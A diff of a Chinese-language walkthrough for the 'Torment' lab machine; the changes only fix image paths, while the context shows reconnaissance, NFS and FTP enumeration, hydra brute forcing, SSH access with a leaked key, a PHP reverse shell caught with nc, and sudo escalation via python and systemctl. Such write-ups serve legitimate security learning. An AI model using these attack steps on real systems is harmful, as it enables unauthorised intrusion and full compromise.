@@ -16,7 +16,7 @@
 
 也可以使用`nmap`等工具进行
 
-![](pic-torment\1.jpg)
+![](./pic-torment/1.jpg)
 
 
 
@@ -30,7 +30,7 @@
 nmap -sT 192.168.10.12 --min-rate=1000  -p- -T4 -oA nmap-tcp
 ```
 
-![](pic-torment\2.jpg)
+![](./pic-torment/2.jpg)
 
 扫描常见的20个`udp`端口，不过这里的端口明显处于`open`的很少
 
@@ -38,7 +38,7 @@ nmap -sT 192.168.10.12 --min-rate=1000  -p- -T4 -oA nmap-tcp
 nmap -sU 192.168.10.12 --top-ports 20 -T4 -oA nmap-udp
 ```
 
-![](pic-torment\3.jpg)
+![](./pic-torment/3.jpg)
 
 把前面扫描出的`tcp`端口，进行处理，只取端口号
 
@@ -47,7 +47,7 @@ grep open nmap-tcp.nmap | awk -F'/' '{print $1}' | paste -sd ','
 ports=21,22,25,80,111,139,143,445,631,2049,6667,6668,6669,6672,6674,36207,38881,48111,53545
 ```
 
-![](pic-torment\4.jpg)
+![](./pic-torment/4.jpg)
 
 对特定的端口号进行深入探测
 
@@ -55,11 +55,11 @@ ports=21,22,25,80,111,139,143,445,631,2049,6667,6668,6669,6672,6674,36207,38881,
 nmap -sV -O -sC -sT 192.168.10.12 -p $ports -oA detail
 ```
 
-![](pic-torment\5.jpg)
+![](./pic-torment/5.jpg)
 
-![6](pic-torment\6.jpg)
+![6](./pic-torment/6.jpg)
 
-![7](pic-torment\7.jpg)
+![7](./pic-torment/7.jpg)
 
 对特定的端口号进行漏洞检测，其他服务并没有内容，只有631端口进行的`http`枚举
 
@@ -67,7 +67,7 @@ nmap -sV -O -sC -sT 192.168.10.12 -p $ports -oA detail
 nmap --script=vuln 192.168.10.12 -p $ports -oA vuln
 ```
 
-![](pic-torment\8.jpg)
+![](./pic-torment/8.jpg)
 
 ## FTP服务探测
 
@@ -77,7 +77,7 @@ nmap --script=vuln 192.168.10.12 -p $ports -oA vuln
 ftp anonymous@192.168.10.12
 ```
 
-![](pic-torment\9.jpg)
+![](./pic-torment/9.jpg)
 
 下载所有文件到`kali`中
 
@@ -96,7 +96,7 @@ ftp> mget *
 
 访问80端口界面，就是默认的`apache2`安装后的界面，查看页面源代码，也没有信息泄露
 
-![](pic-torment\10.jpg)
+![](./pic-torment/10.jpg)
 
 使用`gobuster`进行目录爆破，当然采用其他工具也行，如`dirb、dirsearch`等
 
@@ -104,11 +104,11 @@ ftp> mget *
 gobuster dir -u http://192.168.10.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.bak,.txt,s,.,.html -b 403-404
 ```
 
-![](pic-torment\11.jpg)
+![](./pic-torment/11.jpg)
 
 这里虽然没有扫描完毕，但是这个目录属实是吸引目光，访问查看，只有一段话，页面源代码中也没有信息。好好好，确实痛苦
 
-![](pic-torment\12.jpg)
+![](./pic-torment/12.jpg)
 
 ## nfs服务探测
 
@@ -120,7 +120,7 @@ gobuster dir -u http://192.168.10.12 -w /usr/share/wordlists/dirbuster/directory
 nmap --script=nfs* 192.168.10.12
 ```
 
-![](pic-torment\13.jpg)
+![](./pic-torment/13.jpg)
 
 使用`showmount`再测试
 
@@ -128,7 +128,7 @@ nmap --script=nfs* 192.168.10.12
 showmount -e 192.168.10.12
 ```
 
-![](pic-torment\14.jpg)
+![](./pic-torment/14.jpg)
 
 两个，那么尝试使用`mount`挂载到`kali`
 
@@ -137,7 +137,7 @@ mount -t nfs 192.168.10.12:/var/torture ./tor
 mount -t nfs 192.168.10.12:/var/public ./pub
 ```
 
-![](pic-torment\15.jpg)
+![](./pic-torment/15.jpg)
 
 但是查看后，发现这里面的文件都是空白的，暂时搁置
 
@@ -149,7 +149,7 @@ mount -t nfs 192.168.10.12:/var/public ./pub
 nmap --script=smb* 192.168.10.12
 ```
 
-![](pic-torment\16.jpg)
+![](./pic-torment/16.jpg)
 
 虽然有分享，但是使用`smbclient`连接不了，也就是可能匿名方式不支持
 
@@ -161,11 +161,11 @@ nmap --script=smb* 192.168.10.12
 
 前面扫描出的631端口的服务是`ipp`，网络打印服务。这个可以百度一下
 
-![](pic-torment\17.jpg)
+![](./pic-torment/17.jpg)
 
 访问631端口界面
 
-![](pic-torment\18.jpg)
+![](./pic-torment/18.jpg)
 
 使用`whatweb`探测一下
 
@@ -173,7 +173,7 @@ nmap --script=smb* 192.168.10.12
 whatweb http://192.168.10.12:631
 ```
 
-![](pic-torment\19.jpg)
+![](./pic-torment/19.jpg)
 
 使用`gobuster`进行网站目录爆破
 
@@ -183,13 +183,13 @@ gobuster dir -u http://192.168.10.12:631 -w /usr/share/wordlists/dirbuster/direc
 
 这次的文件有点太多了
 
-![](pic-torment\20.jpg)
+![](./pic-torment/20.jpg)
 
 测试之后，明显不对，这个就不对
 
 在网站中随便点击，发现了一个可能包括用户名的界面`printers`
 
-![](pic-torment\20-1.jpg)
+![](./pic-torment/20-1.jpg)
 
 使用`cewl`爬取
 
@@ -213,19 +213,19 @@ tr '[:upper:]' '[:lower:]' < word > words
 
 再次连接FTP，使用`ls -al`
 
-![](pic-torment\21.jpg)
+![](./pic-torment/21.jpg)
 
 最终查看到`.ngircd、.ssh`目录下有文件
 
-![](pic-torment\22.jpg)
+![](./pic-torment/22.jpg)
 
 查看`id_rsa`，这个不知道谁的私钥
 
-![](pic-torment\23.jpg)
+![](./pic-torment/23.jpg)
 
 查看`channel`，发现是两串字符
 
-![](pic-torment\24.jpg)
+![](./pic-torment/24.jpg)
 
 ## IRC服务探测
 
@@ -245,9 +245,9 @@ apt-get install pidgin
 
 安装后，输入`pidgin`启动
 
-![](pic-torment\25.jpg)
+![](./pic-torment/25.jpg)
 
-![26](pic-torment\26.jpg)
+![26](./pic-torment/26.jpg)
 
 
 
@@ -257,15 +257,15 @@ apt-get install pidgin
 cat /etc/ngircd/ngircd.conf
 ```
 
-![](pic-torment\27.jpg)
+![](./pic-torment/27.jpg)
 
 密码保存后，点击`buddies`菜单，点击`join a chat`，可能刚开始是无法点击的，可以自己测试，我忘了点击哪里后可以加入了。然后输入频道`channels`，这里测试`#games`，发现无内容
 
-![](pic-torment\28.jpg)
+![](./pic-torment/28.jpg)
 
 再加入频道`#tormentedprinter`测试，发现可行，并且获取到一个密码`mostmachineshaveasupersecurekeyandalongpassphrase`
 
-![](pic-torment\29.jpg)
+![](./pic-torment/29.jpg)
 
 根据内容来看，可能是打印机网络界面的登录的密码，不过在尝试爆破后，却没有可用的
 
@@ -273,7 +273,7 @@ cat /etc/ngircd/ngircd.conf
 hydra 192.168.10.12 http-get -L words -p mostmachineshaveasupersecurekeyandalongpassphrase /admin/log/access_log -m "Authorization: Basic %u:%p" -s 631
 ```
 
-![](pic-torment\30.jpg)
+![](./pic-torment/30.jpg)
 
 ## smtp用户枚举
 
@@ -285,7 +285,7 @@ hydra 192.168.10.12 http-get -L words -p mostmachineshaveasupersecurekeyandalong
 smtp-user-enum -U /usr/share/wordlists/wfuzz/others/names.txt -t 192.168.10.12
 ```
 
-![](pic-torment\31.jpg)
+![](./pic-torment/31.jpg)
 
 枚举出的`patrick`用户与前面在打印机网站中包含的一样，也就是这个`patrick`大概率是系统中的用户
 
@@ -305,13 +305,13 @@ smtp-user-enum -U /usr/share/wordlists/wfuzz/others/names.txt -t 192.168.10.12
 
 别忘记更改`id_rsa`文件的权限
 
-![](pic-torment\32.jpg)
+![](./pic-torment/32.jpg)
 
 输入`id_rsa`的密码，也就是`mostmachineshaveasupersecurekeyandalongpassphrase`测试
 
 发现登录成功
 
-![](pic-torment\33.jpg)
+![](./pic-torment/33.jpg)
 
 # 靶机内信息收集
 
@@ -322,7 +322,7 @@ ls -al /home
 cat /etc/passwd | grep /bin/bash
 ```
 
-![](pic-torment\34.jpg)
+![](./pic-torment/34.jpg)
 
 `qiu`的家目录，无权访问，那么继续收集信息
 
@@ -334,7 +334,7 @@ ss -antlp
 netstat -ant
 ```
 
-![](pic-torment\35.jpg)
+![](./pic-torment/35.jpg)
 
 查看定时任务
 
@@ -344,7 +344,7 @@ atq
 cat /etc/crontab
 ```
 
-![](pic-torment\36.jpg)
+![](./pic-torment/36.jpg)
 
 使用`find`寻找具有SUID权限的文件
 
@@ -352,11 +352,11 @@ cat /etc/crontab
 find / -perm -4000 -print 2>/dev/null
 ```
 
-![](pic-torment\37.jpg)
+![](./pic-torment/37.jpg)
 
 使用`sudo -l`发现有三个
 
-![](pic-torment\38.jpg)
+![](./pic-torment/38.jpg)
 
 查看内核版本及系统版本
 
@@ -367,7 +367,7 @@ cat /etc/*release
 lsb_release
 ```
 
-![](pic-torment\39.jpg)
+![](./pic-torment/39.jpg)
 
 查看以`root`身份运行的进程，发现`apache2`服务是以`root`启动的，并且这里大概率是开机启动
 
@@ -375,7 +375,7 @@ lsb_release
 ps -aux | grep root
 ```
 
-![](pic-torment\40.jpg)
+![](./pic-torment/40.jpg)
 
 上传`pspy64`到靶机，查看有无内容，监控了一会，并没有内容产生
 
@@ -385,7 +385,7 @@ ps -aux | grep root
 
 确实发现`apache2`的配置文件是可修改的
 
-![](pic-torment\41.jpg)
+![](./pic-torment/41.jpg)
 
 当然也可以使用命令获取，其他用户具有写权限的文件
 
@@ -393,7 +393,7 @@ ps -aux | grep root
 find / -type f -perm /o+w 2>/dev/null | grep -v "/proc"
 ```
 
-![](pic-torment\42.jpg)
+![](./pic-torment/42.jpg)
 
 # 分析sudo
 
@@ -472,7 +472,7 @@ User qiu
 Group qiu
 ```
 
-![](pic-torment\42-1.jpg)
+![](./pic-torment/42-1.jpg)
 
 然后根据前面的直接测试可能不行，那么就通过网站的`webshell`进行测试吧，首先创建一个反弹`shell`，这里可以使用`kali`中自带的一个文件`/usr/share/webshells/php/php-reverse-shell.php`
 
@@ -480,7 +480,7 @@ Group qiu
 
 把这个文件下载到靶机内，保存到可以访问的网站目录`/var/www/html`
 
-![](pic-torment\43.jpg)
+![](./pic-torment/43.jpg)
 
 这时候执行`sudo /bin/systemctl reboot`重启靶机，这样会连带着`apache2`重启，配置文件可能会重载
 
@@ -492,7 +492,7 @@ nc -lvnp 9999
 
 然后使用浏览器访问上传到靶机内的脚本文件
 
-![](pic-torment\44.jpg)
+![](./pic-torment/44.jpg)
 
 使用`dpkg`等命令测试是否有`python`等
 
@@ -510,7 +510,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 使用`sudo`可以获取到两个文件， 并且不需要密码
 
-![](pic-torment\45.jpg)
+![](./pic-torment/45.jpg)
 
 若是不知道这两个提权方式，可以访问`https://gtfobins.github.io/`查看用法
 
@@ -518,22 +518,22 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 sudo python -c 'import os; os.system("/bin/sh")'
 ```
 
-![](pic-torment\46.jpg)
+![](./pic-torment/46.jpg)
 
 另一个`systemctl`提权，这个提权方式很多，可以通过`.service`文件提权，因为这里没有指定特定的服务，只是这个命令，所以是可以扩展使用的
 
-![](pic-torment\47.jpg)
+![](./pic-torment/47.jpg)
 
 ```
 sudo systemctl
 !sh
 ```
 
-![](pic-torment\48.jpg)
+![](./pic-torment/48.jpg)
 
 切换到`/root`目录，查看文件
 
-![](pic-torment\49.jpg)
+![](./pic-torment/49.jpg)
 
 
 
